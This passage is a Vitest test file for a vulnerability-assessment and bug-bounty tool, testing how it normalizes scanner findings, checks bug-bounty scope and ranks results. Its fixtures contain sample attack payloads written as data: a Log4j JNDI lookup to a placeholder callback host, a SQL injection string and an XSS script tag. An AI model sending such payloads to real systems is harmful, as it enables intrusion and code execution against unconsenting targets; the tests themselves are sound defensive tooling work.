/**
 * VA & Bug Bounty Sprint — Comprehensive Vitest Tests
 * 
 * Tests for:
 * 1. Finding Normalization (normalizers, dedup, merge, batch)
 * 2. Verification Profiles (profile lookup, VA pipeline config, phase gating, prioritization)
 * 3. Bug Bounty Policy Parser (URL parsing, scope checking, originality, submission formatting)
 * 4. Cross-Training (pattern repository, calibration pipeline, tool effectiveness, contamination)
 * 5. License-Tier Gating (tier checks, feature checks, engagement type availability)
 */

import { describe, it, expect, beforeEach } from 'vitest';

// ─── Finding Normalization Tests ───────────────────────────────────────────────

import {
  generateFingerprint,
  inferSeverity,
  inferCorroborationTier,
  normalizeNucleiFinding,
  normalizeZapFinding,
  normalizeBurpFinding,
  normalizeTrivyFinding,
  mergeFindings,
  deduplicateFindings,
  batchNormalize,
  VERIFICATION_CONFIDENCE_MULTIPLIER,
  type NormalizedFinding,
} from './lib/finding-normalization';

describe('Finding Normalization', () => {
  describe('generateFingerprint', () => {
    it('should generate consistent fingerprints for same inputs', () => {
      const fp1 = generateFingerprint({ vulnClass: 'SQL Injection', hostname: 'example.com', port: 443, path: '/api/login' });
      const fp2 = generateFingerprint({ vulnClass: 'SQL Injection', hostname: 'example.com', port: 443, path: '/api/login' });
      expect(fp1).toBe(fp2);
    });

    it('should generate different fingerprints for different vulns', () => {
      const fp1 = generateFingerprint({ vulnClass: 'SQL Injection', hostname: 'example.com' });
      const fp2 = generateFingerprint({ vulnClass: 'XSS', hostname: 'example.com' });
      expect(fp1).not.toBe(fp2);
    });

    it('should generate different fingerprints for different hosts', () => {
      const fp1 = generateFingerprint({ vulnClass: 'SQL Injection', hostname: 'a.com' });
      const fp2 = generateFingerprint({ vulnClass: 'SQL Injection', hostname: 'b.com' });
      expect(fp1).not.toBe(fp2);
    });

    it('should include CVE IDs in fingerprint', () => {
      const fp1 = generateFingerprint({ vulnClass: 'RCE', hostname: 'x.com', cveIds: ['CVE-2024-1234'] });
      const fp2 = generateFingerprint({ vulnClass: 'RCE', hostname: 'x.com' });
      expect(fp1).not.toBe(fp2);
    });

    it('should be case-insensitive for hostname', () => {
      const fp1 = generateFingerprint({ vulnClass: 'XSS', hostname: 'Example.COM' });
      const fp2 = generateFingerprint({ vulnClass: 'XSS', hostname: 'example.com' });
      expect(fp1).toBe(fp2);
    });

    it('should return a 16-char hex string', () => {
      const fp = generateFingerprint({ vulnClass: 'test', hostname: 'test.com' });
      expect(fp).toMatch(/^[a-f0-9]{16}$/);
    });
  });

  describe('inferSeverity', () => {
    it('should map CVSS 9.0+ to critical', () => {
      expect(inferSeverity(9.8)).toBe('critical');
      expect(inferSeverity(9.0)).toBe('critical');
    });

    it('should map CVSS 7.0-8.9 to high', () => {
      expect(inferSeverity(7.0)).toBe('high');
      expect(inferSeverity(8.9)).toBe('high');
    });

    it('should map CVSS 4.0-6.9 to medium', () => {
      expect(inferSeverity(4.0)).toBe('medium');
      expect(inferSeverity(6.9)).toBe('medium');
    });

    it('should map CVSS 0.1-3.9 to low', () => {
      expect(inferSeverity(0.1)).toBe('low');
      expect(inferSeverity(3.9)).toBe('low');
    });

    it('should map CVSS 0 to info', () => {
      expect(inferSeverity(0)).toBe('info');
    });

    it('should use scanner severity when no CVSS', () => {
      expect(inferSeverity(undefined, 'High')).toBe('high');
      expect(inferSeverity(undefined, 'moderate')).toBe('medium');
      expect(inferSeverity(undefined, 'crit')).toBe('critical');
    });

    it('should default to info', () => {
      expect(inferSeverity()).toBe('info');
    });
  });

  describe('inferCorroborationTier', () => {
    it('should return confirmed for exploit_full verification', () => {
      expect(inferCorroborationTier(1, 'heuristic', 'exploit_full')).toBe('confirmed');
    });

    it('should return confirmed for multiple sources', () => {
      expect(inferCorroborationTier(2, 'heuristic', 'unverified')).toBe('confirmed');
      expect(inferCorroborationTier(3, 'heuristic', 'unverified')).toBe('confirmed');
    });

    it('should return probable for single source version match', () => {
      expect(inferCorroborationTier(1, 'version_match', 'unverified')).toBe('probable');
    });

    it('should return confirmed for config check with verification', () => {
      expect(inferCorroborationTier(1, 'config_check', 'configuration_verified')).toBe('confirmed');
    });

    it('should return potential for heuristic single source', () => {
      expect(inferCorroborationTier(1, 'heuristic', 'unverified')).toBe('potential');
    });
  });

  describe('normalizeNucleiFinding', () => {
    it('should normalize a basic Nuclei finding', () => {
      const result = normalizeNucleiFinding({
        templateId: 'CVE-2021-44228',
        info: {
          name: 'Apache Log4j RCE',
          description: 'Remote code execution in Log4j',
          severity: 'critical',
          classification: {
            cve: ['CVE-2021-44228'],
            cwe: ['CWE-94'],
            cvss_score: 10.0,
          },
          tags: ['cve', 'rce', 'log4j'],
        },
        host: 'https://target.com:8443/api',
        matched_at: 'https://target.com:8443/api/endpoint',
        extracted_results: ['${jndi:ldap://callback.com/a}'],
      });

      expect(result.findingId).toBeTruthy();
      expect(result.fingerprint).toBeTruthy();
      expect(result.cveIds).toContain('CVE-2021-44228');
      expect(result.cweIds).toContain('CWE-94');
      expect(result.severity).toBe('critical');
      expect(result.cvssBaseScore).toBe(10.0);
      expect(result.affectedAsset.hostname).toBe('target.com');
      expect(result.affectedAsset.port).toBe(8443);
      expect(result.sources[0].scanner).toBe('nuclei');
      expect(result.sources[0].templateId).toBe('CVE-2021-44228');
      expect(result.evidence.length).toBeGreaterThan(0);
      expect(result.exploitability.hasNucleiTemplate).toBe(true);
    });

    it('should handle minimal Nuclei finding', () => {
      const result = normalizeNucleiFinding({
        templateId: 'tech-detect',
        info: { name: 'Technology Detection', severity: 'info' },
        host: 'http://example.com',
      });

      expect(result.severity).toBe('info');
      expect(result.cveIds).toEqual([]);
      expect(result.affectedAsset.hostname).toBe('example.com');
    });

    it('should extract curl command as evidence', () => {
      const result = normalizeNucleiFinding({
        templateId: 'test',
        info: { name: 'Test', severity: 'medium' },
        host: 'http://test.com',
        curl_command: 'curl -X POST http://test.com/api -d "payload"',
      });

      const curlEvidence = result.evidence.find(e => e.type === 'request');
      expect(curlEvidence).toBeTruthy();
      expect(curlEvidence!.content).toContain('curl');
    });
  });

  describe('normalizeZapFinding', () => {
    it('should normalize a ZAP finding', () => {
      const result = normalizeZapFinding({
        alert: 'SQL Injection',
        risk: 'High',
        confidence: 'Medium',
        url: 'https://target.com/search?q=test',
        param: 'q',
        attack: "' OR 1=1 --",
        evidence: 'SQL syntax error',
        description: 'SQL injection vulnerability',
        cweId: 89,
        pluginId: '40018',
      });

      expect(result.title).toBe('SQL Injection');
      expect(result.severity).toBe('high');
      expect(result.cweIds).toContain('CWE-89');
      expect(result.affectedAsset.parameter).toBe('q');
      expect(result.sources[0].scanner).toBe('zap');
      expect(result.detectionMethod).toBe('behavior_test'); // Has attack payload
      expect(result.detectionConfidence).toBe(0.6); // Medium confidence
    });

    it('should handle ZAP finding without attack', () => {
      const result = normalizeZapFinding({
        alert: 'Missing Header',
        risk: 'Low',
        confidence: 'High',
        url: 'http://example.com',
      });

      expect(result.detectionMethod).toBe('heuristic');
      expect(result.detectionConfidence).toBe(0.85);
    });
  });

  describe('normalizeBurpFinding', () => {
    it('should normalize a Burp finding', () => {
      const result = normalizeBurpFinding({
        name: 'Cross-site scripting (reflected)',
        severity: 'High',
        confidence: 'Certain',
        host: 'https://target.com',
        path: '/search',
        issueType: 2097920,
        issueBackground: 'Reflected XSS allows...',
        remediationBackground: 'Input validation...',
        vulnerabilityClassifications: ['CWE-79: Improper Neutralization'],
        requestResponse: [{
          request: 'GET /search?q=<script> HTTP/1.1',
          response: 'HTTP/1.1 200 OK\n<script>alert(1)</script>',
        }],
      });

      expect(result.title).toBe('Cross-site scripting (reflected)');
      expect(result.severity).toBe('high');
      expect(result.cweIds).toContain('CWE-79');
      expect(result.sources[0].scanner).toBe('burp');
      expect(result.detectionMethod).toBe('behavior_test'); // Certain confidence
      expect(result.detectionConfidence).toBe(0.95);
      expect(result.evidence.length).toBeGreaterThanOrEqual(2); // Request + response
      expect(result.corroborationTier).toBe('confirmed'); // Certain = confirmed
    });

    it('should handle Burp finding with Tentative confidence', () => {
      const result = normalizeBurpFinding({
        name: 'Possible issue',
        severity: 'Information',
        confidence: 'Tentative',
        host: 'http://example.com',
      });

      expect(result.detectionConfidence).toBe(0.4);
      expect(result.corroborationTier).toBe('potential');
    });
  });

  describe('normalizeTrivyFinding', () => {
    it('should normalize a Trivy finding', () => {
      const result = normalizeTrivyFinding({
        VulnerabilityID: 'CVE-2023-44487',
        PkgName: 'golang.org/x/net',
        InstalledVersion: '0.7.0',
        FixedVersion: '0.17.0',
        Severity: 'HIGH',
        Title: 'HTTP/2 Rapid Reset Attack',
        Description: 'The HTTP/2 protocol allows...',
        CVSS: { nvd: { V3Score: 7.5, V3Vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H' } },
        CweIDs: ['CWE-400'],
        Target: 'myapp:latest',
      });

      expect(result.cveIds).toContain('CVE-2023-44487');
      expect(result.severity).toBe('high');
      expect(result.cvssBaseScore).toBe(7.5);
      expect(result.affectedAsset.component).toBe('golang.org/x/net');
      expect(result.affectedAsset.componentVersion).toBe('0.7.0');
      expect(result.detectionMethod).toBe('version_match');
      expect(result.verificationStatus).toBe('configuration_verified');
      expect(result.remediation?.summary).toContain('0.17.0');
      expect(result.corroborationTier).toBe('confirmed');
    });
  });

  describe('mergeFindings', () => {
    it('should merge findings with same fingerprint', () => {
      const fp = generateFingerprint({ vulnClass: 'SQL Injection', hostname: 'target.com', port: 443 });
      const f1: NormalizedFinding = {
        findingId: '1', fingerprint: fp,
        sources: [{ scanner: 'nuclei', scanTimestamp: 1000 }],
        firstSeen: 1000, lastSeen: 1000,
        cveIds: ['CVE-2024-1'], cweIds: ['CWE-89'],
        vulnClass: 'SQL Injection', title: 'SQLi via Nuclei', description: 'test',
        affectedAsset: { hostname: 'target.com', port: 443 },
        severity: 'high', detectionMethod: 'behavior_test', detectionConfidence: 0.7,
        verificationStatus: 'unverified', verificationHistory: [],
        exploitability: { isKev: false, hasMetasploitModule: false, hasNucleiTemplate: true, hasPublicExploit: false, attackComplexity: 'unknown', privilegesRequired: 'unknown', userInteraction: 'unknown' },
        evidence: [{ type: 'proof_of_concept', title: 'Nuclei', content: 'test', timestamp: 1000, capturedBy: 'nuclei' }],
        corroborationCount: 1, corroborationTier: 'probable',
      };
      const f2: NormalizedFinding = {
        ...f1, findingId: '2',
        sources: [{ scanner: 'zap', scanTimestamp: 2000 }],
        firstSeen: 2000, lastSeen: 2000,
        severity: 'critical', detectionConfidence: 0.85,
        evidence: [{ type: 'proof_of_concept', title: 'ZAP', content: 'test2', timestamp: 2000, capturedBy: 'zap' }],
      };

      const merged = mergeFindings([f1, f2]);
      expect(merged.sources.length).toBe(2);
      expect(merged.evidence.length).toBe(2);
      expect(merged.severity).toBe('critical'); // Highest
      expect(merged.corroborationCount).toBe(2);
      expect(merged.corroborationTier).toBe('confirmed'); // 2 sources
      expect(merged.firstSeen).toBe(1000);
      expect(merged.lastSeen).toBe(2000);
      expect(merged.detectionConfidence).toBeGreaterThan(0.85); // Boosted
    });

    it('should throw for empty array', () => {
      expect(() => mergeFindings([])).toThrow();
    });

    it('should return single finding unchanged', () => {
      const f: NormalizedFinding = {
        findingId: '1', fingerprint: 'abc',
        sources: [{ scanner: 'nuclei', scanTimestamp: 1000 }],
        firstSeen: 1000, lastSeen: 1000,
        cveIds: [], cweIds: [], vulnClass: 'test', title: 'test', description: 'test',
        affectedAsset: { hostname: 'test.com' },
        severity: 'low', detectionMethod: 'heuristic', detectionConfidence: 0.5,
        verificationStatus: 'unverified', verificationHistory: [],
        exploitability: { isKev: false, hasMetasploitModule: false, hasNucleiTemplate: false, hasPublicExploit: false, attackComplexity: 'unknown', privilegesRequired: 'unknown', userInteraction: 'unknown' },
        evidence: [], corroborationCount: 1, corroborationTier: 'potential',
      };
      const merged = mergeFindings([f]);
      expect(merged).toBe(f);
    });
  });

  describe('deduplicateFindings', () => {
    it('should deduplicate findings by fingerprint', () => {
      const nuclei = normalizeNucleiFinding({
        templateId: 'sqli-test',
        info: { name: 'SQL Injection', severity: 'high', classification: { cwe: ['CWE-89'] } },
        host: 'https://target.com/api',
      });
      const zap = normalizeZapFinding({
        alert: 'SQL Injection',
        risk: 'High',
        confidence: 'High',
        url: 'https://target.com/api',
        cweId: 89,
      });

      // Same vuln class + same host = same fingerprint
      const deduped = deduplicateFindings([nuclei, zap]);
      // They should merge if fingerprints match
      expect(deduped.length).toBeLessThanOrEqual(2);
    });

    it('should keep distinct findings separate', () => {
      const f1 = normalizeNucleiFinding({
        templateId: 'sqli',
        info: { name: 'SQL Injection', severity: 'high' },
        host: 'https://a.com',
      });
      const f2 = normalizeNucleiFinding({
        templateId: 'xss',
        info: { name: 'Cross-Site Scripting', severity: 'medium' },
        host: 'https://b.com',
      });

      const deduped = deduplicateFindings([f1, f2]);
      expect(deduped.length).toBe(2);
    });
  });

  describe('batchNormalize', () => {
    it('should normalize and deduplicate a batch', () => {
      const result = batchNormalize({
        nucleiFindings: [
          { templateId: 'test1', info: { name: 'Test Vuln 1', severity: 'high' }, host: 'https://a.com' },
          { templateId: 'test2', info: { name: 'Test Vuln 2', severity: 'medium' }, host: 'https://b.com' },
        ],
        zapFindings: [
          { alert: 'Test Alert', risk: 'High', confidence: 'Medium', url: 'https://c.com/page' },
        ],
        trivyFindings: [
          { VulnerabilityID: 'CVE-2024-1234', PkgName: 'lodash', InstalledVersion: '4.17.20', Severity: 'HIGH' },
        ],
      });

      expect(result.stats.totalRaw).toBe(4);
      expect(result.stats.byScannerRaw.nuclei).toBe(2);
      expect(result.stats.byScannerRaw.zap).toBe(1);
      expect(result.stats.byScannerRaw.trivy).toBe(1);
      expect(result.findings.length).toBeGreaterThan(0);
      expect(result.stats.totalDeduplicated).toBeLessThanOrEqual(result.stats.totalNormalized);
    });

    it('should handle empty batch', () => {
      const result = batchNormalize({});
      expect(result.stats.totalRaw).toBe(0);
      expect(result.findings.length).toBe(0);
    });

    it('should skip malformed findings', () => {
      const result = batchNormalize({
        nucleiFindings: [
          { templateId: 'valid', info: { name: 'Valid', severity: 'low' }, host: 'http://test.com' },
        ],
      });
      expect(result.findings.length).toBe(1);
    });
  });

  describe('VERIFICATION_CONFIDENCE_MULTIPLIER', () => {
    it('should have correct multipliers', () => {
      expect(VERIFICATION_CONFIDENCE_MULTIPLIER.unverified).toBe(0.3);
      expect(VERIFICATION_CONFIDENCE_MULTIPLIER.configuration_verified).toBe(0.85);
      expect(VERIFICATION_CONFIDENCE_MULTIPLIER.exploit_full).toBe(1.0);
      expect(VERIFICATION_CONFIDENCE_MULTIPLIER.verification_failed).toBe(0.0);
    });
  });
});

// ─── Verification Profile Tests ────────────────────────────────────────────────

import {
  VERIFICATION_PROFILES,
  listVerificationProfiles,
  getVerificationProfile,
  buildVAPipelineConfig,
  isVerificationAllowed,
  getNextVerificationStep,
  shouldExecutePhase,
  prioritizeFindings,
  buildVAReportData,
} from './lib/verification-profile';

describe('Verification Profiles', () => {
  describe('listVerificationProfiles', () => {
    it('should return all built-in profiles', () => {
      const profiles = listVerificationProfiles();
      expect(profiles.length).toBeGreaterThanOrEqual(7);
      expect(profiles.some(p => p.id === 'standard-va')).toBe(true);
      expect(profiles.some(p => p.id === 'compliance-pci-asv')).toBe(true);
      expect(profiles.some(p => p.id === 'compliance-fedramp-conmon')).toBe(true);
      expect(profiles.some(p => p.id === 'compliance-hipaa')).toBe(true);
      expect(profiles.some(p => p.id === 'compliance-soc2')).toBe(true);
      expect(profiles.some(p => p.id === 'deep-assessment')).toBe(true);
      expect(profiles.some(p => p.id === 'continuous-monitoring')).toBe(true);
    });
  });

  describe('getVerificationProfile', () => {
    it('should return profile by ID', () => {
      const profile = getVerificationProfile('standard-va');
      expect(profile).toBeTruthy();
      expect(profile!.name).toBe('Standard Vulnerability Assessment');
    });

    it('should return undefined for unknown profile', () => {
      expect(getVerificationProfile('nonexistent')).toBeUndefined();
    });
  });

  describe('buildVAPipelineConfig', () => {
    it('should build config with all phases', () => {
      const config = buildVAPipelineConfig({
        engagementId: 1,
        profileId: 'standard-va',
        targets: ['example.com'],
      });

      expect(config.engagementId).toBe(1);
      expect(config.phases).toContain('asset_discovery');
      expect(config.phases).toContain('vuln_detection');
      expect(config.phases).toContain('llm_synthesis');
      expect(config.phases).toContain('reporting');
      // VA pipeline should NOT have exploitation
      expect(config.phases).not.toContain('exploitation');
    });

    it('should skip phases for continuous monitoring', () => {
      const config = buildVAPipelineConfig({
        engagementId: 1,
        profileId: 'continuous-monitoring',
        targets: ['example.com'],
      });

      expect(config.skipPhases).toContain('verification');
      expect(config.skipPhases).toContain('llm_synthesis');
    });

    it('should include compliance frameworks from profile', () => {
      const config = buildVAPipelineConfig({
        engagementId: 1,
        profileId: 'compliance-pci-asv',
        targets: ['example.com'],
      });

      expect(config.selectedFrameworks).toContain('pci-dss-v4');
      expect(config.includeComplianceMapping).toBe(true);
    });

    it('should fall back to standard-va for unknown profile', () => {
      const config = buildVAPipelineConfig({
        engagementId: 1,
        profileId: 'nonexistent',
        targets: ['example.com'],
      });

      expect(config.profile.id).toBe('standard-va');
    });
  });

  describe('isVerificationAllowed', () => {
    it('should allow behavior_verified for standard-va', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      expect(isVerificationAllowed('behavior_verified', profile)).toBe(true);
    });

    it('should NOT allow exploit_full for any VA profile', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      expect(isVerificationAllowed('exploit_full', profile)).toBe(false);
    });

    it('should NOT allow exploit_safe for standard VA', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      expect(isVerificationAllowed('exploit_safe', profile)).toBe(false);
    });

    it('should allow configuration_verified for continuous monitoring', () => {
      const profile = VERIFICATION_PROFILES['continuous-monitoring'];
      expect(isVerificationAllowed('configuration_verified', profile)).toBe(true);
    });

    it('should NOT allow behavior_verified for continuous monitoring', () => {
      const profile = VERIFICATION_PROFILES['continuous-monitoring'];
      expect(isVerificationAllowed('behavior_verified', profile)).toBe(false);
    });
  });

  describe('getNextVerificationStep', () => {
    it('should return configuration_verified from unverified', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      expect(getNextVerificationStep('unverified', profile)).toBe('configuration_verified');
    });

    it('should return behavior_verified from configuration_verified', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      expect(getNextVerificationStep('configuration_verified', profile)).toBe('behavior_verified');
    });

    it('should return null when at max depth', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      expect(getNextVerificationStep('behavior_verified', profile)).toBeNull();
    });

    it('should return null for continuous monitoring at config_verified', () => {
      const profile = VERIFICATION_PROFILES['continuous-monitoring'];
      expect(getNextVerificationStep('configuration_verified', profile)).toBeNull();
    });
  });

  describe('shouldExecutePhase', () => {
    it('should return true for included phases', () => {
      const config = buildVAPipelineConfig({ engagementId: 1, profileId: 'standard-va', targets: ['x.com'] });
      expect(shouldExecutePhase('vuln_detection', config)).toBe(true);
    });

    it('should return false for skipped phases', () => {
      const config = buildVAPipelineConfig({ engagementId: 1, profileId: 'continuous-monitoring', targets: ['x.com'] });
      expect(shouldExecutePhase('verification', config)).toBe(false);
    });
  });

  describe('prioritizeFindings', () => {
    it('should rank critical findings higher', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      const findings: NormalizedFinding[] = [
        createMockFinding({ severity: 'low', title: 'Low' }),
        createMockFinding({ severity: 'critical', title: 'Critical' }),
        createMockFinding({ severity: 'medium', title: 'Medium' }),
      ];

      const prioritized = prioritizeFindings(findings, profile);
      expect(prioritized[0].title).toBe('Critical');
      expect(prioritized[0].priorityRank).toBe(1);
      expect(prioritized[0].priorityScore).toBeGreaterThan(prioritized[1].priorityScore);
    });

    it('should boost KEV findings', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      const kevFinding = createMockFinding({ severity: 'high', title: 'KEV' });
      kevFinding.exploitability.isKev = true;
      const normalFinding = createMockFinding({ severity: 'high', title: 'Normal' });

      const prioritized = prioritizeFindings([normalFinding, kevFinding], profile);
      const kevResult = prioritized.find(f => f.title === 'KEV')!;
      const normalResult = prioritized.find(f => f.title === 'Normal')!;
      expect(kevResult.priorityScore).toBeGreaterThan(normalResult.priorityScore);
    });

    it('should set remediation deadlines for compliance profiles', () => {
      const profile = VERIFICATION_PROFILES['compliance-pci-asv'];
      const findings = [createMockFinding({ severity: 'critical' })];
      const prioritized = prioritizeFindings(findings, profile);
      expect(prioritized[0].remediationDeadline).toBeTruthy();
    });
  });

  describe('buildVAReportData', () => {
    it('should build report with executive summary', () => {
      const profile = VERIFICATION_PROFILES['standard-va'];
      const findings = prioritizeFindings([
        createMockFinding({ severity: 'critical' }),
        createMockFinding({ severity: 'high' }),
        createMockFinding({ severity: 'medium' }),
      ], profile);

      const report = buildVAReportData({
        engagementId: 1,
        profileId: 'standard-va',
        findings,
        scannerCoverage: { scannersUsed: ['nuclei', 'zap'], totalTargets: 1, totalAssetsDiscovered: 5, scanDurationMinutes: 30 },
        selectedFrameworks: [],
      });

      expect(report.executiveSummary.totalFindings).toBe(3);
      expect(report.executiveSummary.bySeverity.critical).toBe(1);
      expect(report.remediationRoadmap.immediate.length).toBeGreaterThan(0);
    });
  });
});

// ─── Bug Bounty Policy Parser Tests ────────────────────────────────────────────

import {
  parseProgramUrl,
  createSkeletonPolicy,
  checkScope,
  batchCheckScope,
  formatSubmission,
  checkOriginality,
  enrichPolicyFromParsedText,
  type PolicyROE,
  type BugBountyFinding,
} from './lib/bug-bounty-policy-parser';

describe('Bug Bounty Policy Parser', () => {
  describe('parseProgramUrl', () => {
    it('should parse HackerOne URL', () => {
      const result = parseProgramUrl('https://hackerone.com/github');
      expect(result).toBeTruthy();
      expect(result!.platform).toBe('hackerone');
      expect(result!.programSlug).toBe('github');
    });

    it('should parse Bugcrowd URL', () => {
      const result = parseProgramUrl('https://bugcrowd.com/tesla');
      expect(result).toBeTruthy();
      expect(result!.platform).toBe('bugcrowd');
      expect(result!.programSlug).toBe('tesla');
    });

    it('should parse Intigriti URL', () => {
      const result = parseProgramUrl('https://app.intigriti.com/researcher/programs/test-program');
      expect(result).toBeTruthy();
      expect(result!.platform).toBe('intigriti');
    });

    it('should parse YesWeHack URL', () => {
      const result = parseProgramUrl('https://yeswehack.com/programs/example');
      expect(result).toBeTruthy();
      expect(result!.platform).toBe('yeswehack');
    });

    it('should return null for unknown URL', () => {
      expect(parseProgramUrl('https://example.com/program')).toBeNull();
    });
  });

  describe('createSkeletonPolicy', () => {
    it('should create a skeleton with defaults', () => {
      const skeleton = createSkeletonPolicy({
        platform: 'hackerone',
        programSlug: 'test',
        programUrl: 'https://hackerone.com/test',
      });

      expect(skeleton.platform).toBe('hackerone');
      expect(skeleton.programId).toBe('hackerone:test');
      expect(skeleton.scope.inScope).toEqual([]);
      expect(skeleton.rules.prohibitedActions.length).toBeGreaterThan(0);
      expect(skeleton.bounty.hasBounty).toBe(true);
      expect(skeleton.parseConfidence).toBe(0.3); // Low for skeleton
    });
  });

  describe('checkScope', () => {
    let policy: PolicyROE;

    beforeEach(() => {
      policy = createSkeletonPolicy({
        platform: 'hackerone',
        programSlug: 'test',
        programUrl: 'https://hackerone.com/test',
      });
      policy.scope.inScope = [
        { type: 'domain', target: 'app.example.com', bountyEligible: true },
        { type: 'domain', target: 'api.example.com', bountyEligible: true },
        { type: 'domain', target: 'staging.example.com', bountyEligible: false },
      ];
      policy.scope.outOfScope = [
        { type: 'domain', target: 'blog.example.com', bountyEligible: false },
      ];
      policy.scope.wildcardDomains = ['*.example.com'];
    });

    it('should match in-scope domain', () => {
      const result = checkScope('https://app.example.com/api', policy);
      expect(result.inScope).toBe(true);
      expect(result.bountyEligible).toBe(true);
    });

    it('should match out-of-scope domain', () => {
      const result = checkScope('https://blog.example.com', policy);
      expect(result.inScope).toBe(false);
    });

    it('should match wildcard domain', () => {
      const result = checkScope('https://new.example.com', policy);
      expect(result.inScope).toBe(true);
    });

    it('should report non-bounty-eligible targets', () => {
      const result = checkScope('https://staging.example.com', policy);
      expect(result.inScope).toBe(true);
      expect(result.bountyEligible).toBe(false);
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it('should reject unknown targets', () => {
      const result = checkScope('https://other.com', policy);
      expect(result.inScope).toBe(false);
    });
  });

  describe('batchCheckScope', () => {
    it('should check multiple targets', () => {
      const policy = createSkeletonPolicy({
        platform: 'hackerone',
        programSlug: 'test',
        programUrl: 'https://hackerone.com/test',
      });
      policy.scope.inScope = [
        { type: 'domain', target: 'a.com', bountyEligible: true },
      ];

      const results = batchCheckScope(['a.com', 'b.com'], policy);
      expect(results.get('a.com')!.inScope).toBe(true);
      expect(results.get('b.com')!.inScope).toBe(false);
    });
  });

  describe('checkOriginality', () => {
    it('should flag known issues', () => {
      const finding: BugBountyFinding = createMockBugBountyFinding({
        vulnType: 'SQL Injection',
        target: 'app.example.com',
        endpoint: '/api/search',
      });

      const result = checkOriginality(finding, [
        { title: 'Known SQLi', vulnType: 'SQL Injection', target: 'app.example.com', endpoint: '/api/search', source: 'program_disclosure' },
      ], []);

      expect(result.isLikelyOriginal).toBe(false);
      expect(result.knownIssueMatches.length).toBeGreaterThan(0);
    });

    it('should flag common non-original patterns', () => {
      const finding = createMockBugBountyFinding({
        title: 'Missing X-Frame-Options Header',
        vulnType: 'Missing Header',
      });

      const result = checkOriginality(finding, [], []);
      expect(result.duplicateIndicators.length).toBeGreaterThan(0);
    });

    it('should pass original findings', () => {
      const finding = createMockBugBountyFinding({
        vulnType: 'Remote Code Execution',
        target: 'unique-target.com',
      });

      const result = checkOriginality(finding, [], []);
      expect(result.isLikelyOriginal).toBe(true);
      expect(result.confidence).toBeGreaterThan(0.5);
    });
  });

  describe('formatSubmission', () => {
    it('should format for HackerOne', () => {
      const finding = createMockBugBountyFinding({});
      const draft = formatSubmission(finding, 'hackerone');
      expect(draft.platform).toBe('hackerone');
      expect(draft.description).toContain('## Summary');
      expect(draft.description).toContain('## Steps to Reproduce');
      expect(draft.description).toContain('## Impact');
    });

    it('should format for Bugcrowd', () => {
      const finding = createMockBugBountyFinding({});
      const draft = formatSubmission(finding, 'bugcrowd');
      expect(draft.platform).toBe('bugcrowd');
      expect(draft.description).toContain('## Proof of Concept');
    });

    it('should format for generic platform', () => {
      const finding = createMockBugBountyFinding({});
      const draft = formatSubmission(finding, 'custom');
      expect(draft.platform).toBe('custom');
    });
  });

  describe('enrichPolicyFromParsedText', () => {
    it('should merge parsed data into skeleton', () => {
      const skeleton = createSkeletonPolicy({
        platform: 'hackerone',
        programSlug: 'test',
        programUrl: 'https://hackerone.com/test',
      });

      const enriched = enrichPolicyFromParsedText(skeleton, {
        scope: {
          inScope: [{ type: 'domain', target: 'app.test.com', bountyEligible: true }],
          outOfScope: [],
          wildcardDomains: [],
        },
        parseConfidence: 0.8,
      });

      expect(enriched.scope.inScope.length).toBe(1);
      expect(enriched.parseConfidence).toBe(0.8);
    });
  });
});

// ─── Cross-Training Tests ──────────────────────────────────────────────────────

import {
  PatternRepository,
  CalibrationPipeline,
  ToolEffectivenessTracker,
  getReproductionGuidelines,
  processCrossTrainingBatch,
  type ExtractedPattern,
  type OutcomeLogEntry,
} from './lib/cross-training';

describe('Cross-Training Infrastructure', () => {
  describe('PatternRepository', () => {
    let repo: PatternRepository;

    beforeEach(() => {
      repo = new PatternRepository();
    });

    it('should add context-independent patterns', () => {
      const pattern = createMockPattern({ isContextIndependent: true });
      expect(repo.addPattern(pattern)).toBe(true);
      expect(repo.getStats().totalPatterns).toBe(1);
    });

    it('should reject context-dependent patterns', () => {
      const pattern = createMockPattern({ isContextIndependent: false });
      expect(repo.addPattern(pattern)).toBe(false);
    });

    it('should reject patterns with IP addresses', () => {
      const pattern = createMockPattern({
        isContextIndependent: true,
        description: 'Found at 192.168.1.1',
      });
      expect(repo.addPattern(pattern)).toBe(false);
    });

    it('should reject patterns with domain names', () => {
      const pattern = createMockPattern({
        isContextIndependent: true,
        description: 'Found on target.com',
      });
      expect(repo.addPattern(pattern)).toBe(false);
    });

    it('should reject patterns with URLs', () => {
      const pattern = createMockPattern({
        isContextIndependent: true,
        description: 'Visit https://example.org for details',
      });
      expect(repo.addPattern(pattern)).toBe(false);
    });

    it('should merge duplicate patterns', () => {
      const pattern = createMockPattern({ isContextIndependent: true, id: 'p1' });
      repo.addPattern(pattern);
      repo.addPattern({ ...pattern, successRate: 0.9 });
      expect(repo.getStats().totalPatterns).toBe(1);
    });

    it('should get patterns by vuln class', () => {
      repo.addPattern(createMockPattern({ isContextIndependent: true, vulnClass: 'SQL Injection', id: 'p1' }));
      repo.addPattern(createMockPattern({ isContextIndependent: true, vulnClass: 'XSS', id: 'p2' }));

      const sqliPatterns = repo.getPatterns('SQL Injection');
      expect(sqliPatterns.length).toBe(1);
    });

    it('should get high confidence patterns', () => {
      repo.addPattern(createMockPattern({ isContextIndependent: true, confidence: 0.9, id: 'p1' }));
      repo.addPattern(createMockPattern({ isContextIndependent: true, confidence: 0.3, id: 'p2' }));

      const high = repo.getHighConfidencePatterns(0.7);
      expect(high.length).toBe(1);
    });

    it('should export and import patterns', () => {
      repo.addPattern(createMockPattern({ isContextIndependent: true, id: 'p1' }));
      const exported = repo.exportPatterns();
      
      const newRepo = new PatternRepository();
      const result = newRepo.importPatterns(exported);
      expect(result.imported).toBe(1);
    });
  });

  describe('CalibrationPipeline', () => {
    let pipeline: CalibrationPipeline;

    beforeEach(() => {
      pipeline = new CalibrationPipeline();
    });

    it('should record outcomes', () => {
      pipeline.recordOutcome({ vulnClass: 'SQLi', scannerUsed: 'nuclei', detectionMethod: 'behavior_test', wasAccepted: true });
      const cal = pipeline.getScannerCalibration('nuclei');
